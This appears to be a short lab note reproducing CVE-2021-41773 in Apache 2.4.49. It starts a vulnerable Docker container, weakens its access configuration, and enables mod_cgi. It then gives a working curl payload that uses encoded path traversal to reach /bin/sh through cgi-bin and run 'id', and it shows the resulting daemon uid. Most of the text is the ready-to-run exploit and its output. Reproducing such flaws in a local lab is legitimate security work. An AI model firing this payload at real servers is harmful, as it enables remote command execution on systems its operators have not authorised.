Test cve-2021-41773

# run vulnerable apache 2.4.49

docker run -dit --name cve2021-41773 -p 8080:80 -v  /opt/apache2.4.49:/usr/local/apache2/htdocs/ httpd:2.4.49

# require all granted

docker exec -it cve2021-41773 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it cve2021-41773 sed -i "0,/denied/s/denied/granted/"  conf/httpd.conf

# mod-cgi enabled
docker exec -it cve2021-41773  sed -i 's,#\(LoadModule cgid_module modules/mod_cgi.so\),\1,g' /usr/local/apache2/conf/httpd.conf
docker exec -it cve2021-41773  sed -i 's,#\(LoadModule cgid_module modules/mod_cgid.so\),\1,g' /usr/local/apache2/conf/httpd.conf

#restart apache
docker kill --signal="USR1" cve2021-41773
    
$ curl --data "echo;id" 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'

uid=1(daemon) gid=1(daemon) groups=1(daemon)

References : 
https://gist.github.com/juananpe/7de0c6a405902dbd616b0753e2205533
https://twitter.com/snyff/status/1445592492183724041
https://twitter.com/leonjza/status/1445650538847039495